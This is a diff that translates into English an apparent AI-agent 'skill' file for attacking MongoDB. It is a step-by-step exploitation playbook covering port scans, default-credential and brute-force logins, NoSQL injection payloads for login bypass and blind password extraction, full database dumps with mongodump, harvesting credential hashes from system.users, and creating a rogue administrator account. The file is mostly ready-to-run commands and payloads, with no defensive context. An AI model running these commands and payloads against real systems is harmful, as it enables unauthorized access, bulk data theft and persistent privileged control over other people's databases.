@@ -1,72 +1,74 @@
 ---
 name: mongodb-attack
-description: "MongoDB 未授权访问与 NoSQL 注入利用。当发现目标开放 27017 端口、MongoDB 服务无认证、Web 应用使用 MongoDB 后端存在 NoSQL 注入、或需要从 MongoDB 提取数据时使用。覆盖未授权访问、数据库枚举与导出、NoSQL 注入（$ne/$regex/$where/盲注）、JavaScript 执行（mapReduce/eval）、权限提升、GridFS 文件提取、配置文件凭据"
+description: "MongoDB unauthorized access and NoSQL injection exploitation. Use when a target exposes port 27017, the MongoDB service has no authentication, a web application backed by MongoDB is suspected of NoSQL injection, or you need to extract data from MongoDB. Covers unauthorized access, database enumeration and dumping, NoSQL injection ($ne/$regex/$where/blind injection), JavaScript execution (mapReduce/eval), privilege escalation, GridFS file extraction, and configuration file credentials"
+zh-signals: "利用 MongoDB 未授权访问与 NoSQL 注入，涵盖数据库枚举、导出、JS 执行与提权。信号:MongoDB,未授权访问,NoSQL注入,27017,数据导出"
+when-to-use: "Use when a target exposes MongoDB on port 27017 without authentication, or a MongoDB-backed web app is suspected of NoSQL injection, and you need to enumerate or extract data."
 metadata:
-  tags: "mongodb,mongo,27017,nosql,nosql-injection,$ne,$regex,$where,mapreduce,gridfs,未授权,mongodump"
+  tags: "mongodb,mongo,27017,nosql,nosql-injection,$ne,$regex,$where,mapreduce,gridfs,unauthorized,mongodump"
   category: "exploit"
 ---
 
-# MongoDB 未授权访问与 NoSQL 注入利用
+# MongoDB Unauthorized Access and NoSQL Injection Exploitation
 
-MongoDB 默认监听 27017 端口且早期版本无需认证，暴露在网络上时面临完整数据泄露风险。同时，使用 MongoDB 的 Web 应用普遍存在 NoSQL 注入漏洞。
+MongoDB listens on port 27017 by default and early versions require no authentication, so a network-exposed instance risks full data leakage. At the same time, web applications using MongoDB are widely affected by NoSQL injection vulnerabilities.
 
-## ⛔ 深入参考（必读）
-- 完整利用命令和 payload → 读 [references/attack-techniques.md](references/attack-techniques.md)
+## ⛔ Further Reading (Must Read)
+- Full exploitation commands and payloads → read [references/attack-techniques.md](references/attack-techniques.md)
 
 ---
 
-## Phase 1: 服务发现与版本识别
+## Phase 1: Service Discovery and Version Identification
 
-### 1.1 Nmap 扫描
+### 1.1 Nmap Scan
 
 ```bash
-# MongoDB 信息收集脚本
+# MongoDB information gathering script
 nmap -p 27017 --script mongodb-info TARGET
 
-# 版本探测
+# Version detection
 nmap -sV -p 27017 TARGET
 
-# 检查 MongoDB 相关端口（27017 默认、27018 shardsvr、27019 configsvr、28017 HTTP 状态页）
+# Check MongoDB related ports (27017 default, 27018 shardsvr, 27019 configsvr, 28017 HTTP status page)
 nmap -p 27017-27019,28017 TARGET
 ```
 
-### 1.2 手动连接测试
+### 1.2 Manual Connection Test
 
 ```bash
-# mongosh 连接（MongoDB 5.0+ 推荐客户端）
+# mongosh connection (recommended client for MongoDB 5.0+)
 mongosh --host TARGET --port 27017
 
-# legacy mongo shell（MongoDB 4.x 及更早版本）
+# Legacy mongo shell (MongoDB 4.x and earlier)
 mongo --host TARGET --port 27017
 
-# 快速版本检测
+# Quick version detection
 mongosh --host TARGET --port 27017 --eval "db.version()"
 
-# 服务器状态
+# Server status
 mongosh --host TARGET --port 27017 --eval "db.serverStatus()"
 ```
 
-**关键判断**：
-- 连接成功且无认证提示 → 未授权访问，直接进入 Phase 3
-- 返回 `Authentication failed` → 需要认证，进入 Phase 2
-- `db.version()` → 确定版本，决定可用攻击路径（eval 在 4.2 后移除）
+**Key Decision**:
+- Connection succeeds with no authentication prompt → unauthorized access, go straight to Phase 3
+- `Authentication failed` returned → authentication required, go to Phase 2
+- `db.version()` → determine the version and decide which attack paths are available (eval was removed after 4.2)
 
 ---
 
-## Phase 2: 未授权/弱口令检测
+## Phase 2: Unauthorized / Weak Credential Detection
 
-### 2.1 无密码连接测试
+### 2.1 Passwordless Connection Test
 
 ```bash
-# 直接连接后尝试操作
+# Connect directly and try an operation
 mongosh --host TARGET --port 27017 --eval "show dbs"
-# 成功返回数据库列表 → 无认证
+# The database list is returned successfully → no authentication
 ```
 
-### 2.2 默认凭据检测
+### 2.2 Default Credential Detection
 
 ```bash
-# 常见默认账号密码
+# Common default usernames and passwords
 mongosh --host TARGET --port 27017 -u admin -p admin --authenticationDatabase admin
 mongosh --host TARGET --port 27017 -u root -p root --authenticationDatabase admin
 mongosh --host TARGET --port 27017 -u admin -p password --authenticationDatabase admin
@@ -74,7 +76,7 @@ mongosh --host TARGET --port 27017 -u admin -p 123456 --authenticationDatabase a
 mongosh --host TARGET --port 27017 -u mongodb -p mongodb --authenticationDatabase admin
 ```
 
-### 2.3 爆破工具
+### 2.3 Brute Force Tools
 
 ```bash
 # Hydra
@@ -91,128 +93,128 @@ msf> run
 
 ---
 
-## Phase 3: 攻击决策树
+## Phase 3: Attack Decision Tree
 
 ```
-连接成功？
-├─ 无认证 → 数据库枚举 + mongodump 全量导出 (Phase 5)
-├─ Web 应用 NoSQL 注入
-│   ├─ 登录绕过 → {"$ne": ""} / {"$regex": ".*"} (Phase 4)
-│   ├─ 数据提取 → $regex 逐字符盲注 (Phase 4)
-│   └─ RCE → $where + JS 执行 (Phase 4)
-├─ 有低权限 → createUser 提权 / grantRolesToUser
-│   → 读 references/attack-techniques.md 第 5 节
-├─ 有 eval 权限 → db.eval() / mapReduce JS 执行
-│   → 读 references/attack-techniques.md 第 4 节
-└─ 有文件系统访问 → GridFS 文件提取 / 配置文件读取
-    → 读 references/attack-techniques.md 第 6、7 节
+Connection successful?
+├─ No authentication → database enumeration + full mongodump export (Phase 5)
+├─ NoSQL injection in the web application
+│   ├─ Authentication bypass → {"$ne": ""} / {"$regex": ".*"} (Phase 4)
+│   ├─ Data extraction → $regex character-by-character blind injection (Phase 4)
+│   └─ RCE → $where + JavaScript execution (Phase 4)
+├─ Low-privilege access → createUser privilege escalation / grantRolesToUser
+│   → read section 5 of references/attack-techniques.md
+├─ eval permission available → db.eval() / mapReduce JavaScript execution
+│   → read section 4 of references/attack-techniques.md
+└─ Filesystem access available → GridFS file extraction / configuration file reading
+    → read sections 6 and 7 of references/attack-techniques.md
 ```
 
-**前置信息收集**：
+**Preliminary Information Gathering**:
 
 ```bash
-# 当前用户角色信息
+# Current user role information
 mongosh --host TARGET --port 27017 --eval "db.runCommand({connectionStatus: 1})"
 
-# 获取服务器配置参数
+# Get the server configuration parameters
 mongosh --host TARGET --port 27017 --eval "db.adminCommand({getCmdLineOpts: 1})"
 
-# 列出所有用户（需要 admin 库权限）
+# List all users (requires admin database privileges)
 mongosh --host TARGET --port 27017 --eval "use admin; db.system.users.find().forEach(printjson)"
 ```
 
 ---
 
-## Phase 4: NoSQL 注入速查
+## Phase 4: NoSQL Injection Quick Reference
 
-### 4.1 登录绕过
+### 4.1 Authentication Bypass
 
 ```
-# HTTP POST（JSON 格式）
+# HTTP POST (JSON format)
 {"username": {"$ne": ""}, "password": {"$ne": ""}}
 {"username": {"$gt": ""}, "password": {"$gt": ""}}
 {"username": "admin", "password": {"$regex": ".*"}}
 
-# URL 参数格式
+# URL parameter format
 username[$ne]=&password[$ne]=
 username=admin&password[$regex]=.*
 ```
 
-### 4.2 数据提取（$regex 盲注模式）
+### 4.2 Data Extraction ($regex blind injection pattern)
 
 ```
-# 逐字符猜解密码
+# Guess the password character by character
 {"username": "admin", "password": {"$regex": "^a"}}
 {"username": "admin", "password": {"$regex": "^ab"}}
 {"username": "admin", "password": {"$regex": "^abc"}}
 ...
 ```
 
-### 4.3 JavaScript 注入
+### 4.3 JavaScript Injection
 
 ```
-# $where 条件注入
+# $where condition injection
 {"$where": "this.username == 'admin' && this.password == 'secret'"}
 
-# 时间盲注
+# Time-based blind injection
 {"$where": "if(this.username=='admin'){sleep(5000);return true}"}
 ```
 
-→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取完整 NoSQL 注入 payload
+→ Read [references/attack-techniques.md](references/attack-techniques.md) for complete NoSQL injection payloads
 
 ---
 
-## Phase 5: 数据导出速查
+## Phase 5: Data Export Quick Reference
 
-### 5.1 数据库枚举
+### 5.1 Database Enumeration
 
 ```bash
-# 列出所有数据库
+# List all databases
 mongosh --host TARGET --port 27017 --eval "db.getMongo().getDBNames()"
 
-# 列出集合
+# List collections
 mongosh --host TARGET --port 27017 --eval "use database_name; show collections"
 
-# 查看集合文档数
+# Count documents in a collection
 mongosh --host TARGET --port 27017 --eval "use database_name; db.collection.countDocuments({})"
 
-# 搜索敏感字段
+# Search for sensitive fields
 mongosh --host TARGET --port 27017 --eval "use database_name; db.collection.find({password: {\$exists: true}})"
 ```
 
-### 5.2 全量导出
+### 5.2 Full Export
 
 ```bash
-# 导出所有数据库
+# Export all databases
 mongodump --host TARGET --port 27017 --out /tmp/mongodb-dump
 
-# 导出指定数据库
+# Export a specific database
 mongodump --host TARGET --port 27017 -d database_name --out /tmp/mongodb-dump
 
-# 导出为 JSON 格式
+# Export in JSON format
 mongoexport --host TARGET --port 27017 -d database_name -c collection_name --out /tmp/data.json
 
-# 带认证的导出
+# Export with authentication
 mongodump --host TARGET --port 27017 -u admin -p password --authenticationDatabase admin --out /tmp/mongodb-dump
 ```
 
-→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取完整数据导出命令
+→ Read [references/attack-techniques.md](references/attack-techniques.md) for the complete data export commands
 
 ---
 
-## Phase 6: JavaScript 执行与权限提升
+## Phase 6: JavaScript Execution and Privilege Escalation
 
 ### 6.1 db.eval() (MongoDB < 4.2)
 
 ```javascript
-// 执行任意 JavaScript（需要 admin 权限）
+// Execute arbitrary JavaScript (requires admin privileges)
 db.eval("return db.getMongo().getDBNames()")
 ```
 
-### 6.2 mapReduce JS 执行
+### 6.2 mapReduce JavaScript Execution
 
 ```javascript
-// 通过 mapReduce 执行 JavaScript
+// Execute JavaScript through mapReduce
 db.collection.mapReduce(
   function() { emit(this._id, 1); },
   function(k, v) { return Array.sum(v); },
@@ -220,41 +222,41 @@ db.collection.mapReduce(
 )
 ```
 
-### 6.3 权限提升速查
+### 6.3 Privilege Escalation Quick Reference
 
 ```javascript
-// 创建管理员用户
+// Create an administrator user
 db.createUser({user: "attacker", pwd: "password", roles: [{role: "userAdminAnyDatabase", db: "admin"}]})
 
-// 提升已有用户权限
+// Elevate the privileges of an existing user
 db.grantRolesToUser("attacker", [{role: "root", db: "admin"}])
 ```
 
-→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取完整 JS 执行与提权命令
+→ Read [references/attack-techniques.md](references/attack-techniques.md) for the complete JavaScript execution and privilege escalation commands
 
 ---
 
-## 工具速查
+## Tool Quick Reference
 
-| 工具 | 用途 |
+| Tool | Purpose |
 |------|------|
-| mongosh / mongo | MongoDB 客户端（mongosh 为新版，mongo 为旧版） |
-| mongodump | 数据库全量导出（BSON 格式） |
-| mongoexport | 集合 JSON/CSV 导出 |
-| mongofiles | GridFS 文件操作工具 |
-| NoSQLMap | NoSQL 注入自动化扫描与利用 |
-| nosqlinjection | Burp Suite NoSQL 注入插件 |
-| nmap mongodb-info | MongoDB 信息收集 NSE 脚本 |
+| mongosh / mongo | MongoDB clients (mongosh is the new one, mongo is the legacy one) |
+| mongodump | Full database export (BSON format) |
+| mongoexport | Collection export to JSON/CSV |
+| mongofiles | GridFS file operations tool |
+| NoSQLMap | Automated NoSQL injection scanning and exploitation |
+| nosqlinjection | Burp Suite NoSQL injection plugin |
+| nmap mongodb-info | MongoDB information gathering NSE script |
 
 ---
 
-## 注意事项
+## Notes
 
-- MongoDB 3.0 之前默认无认证、绑定 0.0.0.0，暴露实例极多
-- MongoDB 3.6+ 默认绑定 localhost，需确认是否暴露在外网
-- `db.eval()` 在 MongoDB 4.2 中已移除，4.2+ 版本不可用
-- `mongodump` 全量导出时注意数据量，大库可能耗时很长
-- NoSQL 注入的 `$where` 操作非常慢，生产环境可能引起性能问题
-- 操作 admin 库的 `system.users` 可直接获取所有用户凭据哈希
-- GridFS 中可能存储大量二进制文件（图片、文档），选择性下载
-- 配置文件 `/etc/mongod.conf` 中可能包含明文 keyFile 路径和绑定配置
+- MongoDB before 3.0 has no authentication by default and binds to 0.0.0.0, so exposed instances are very common
+- MongoDB 3.6+ binds to localhost by default — confirm whether the instance is exposed to the public internet
+- `db.eval()` was removed in MongoDB 4.2 and is unavailable on 4.2+ versions
+- Watch the data volume during a full `mongodump` export — large databases can take a very long time
+- The `$where` operation in NoSQL injection is very slow and may cause performance issues in production
+- Accessing `system.users` in the admin database directly yields all user credential hashes
+- GridFS may store a large number of binary files (images, documents) — download selectively
+- The configuration file `/etc/mongod.conf` may contain the plaintext keyFile path and binding configuration
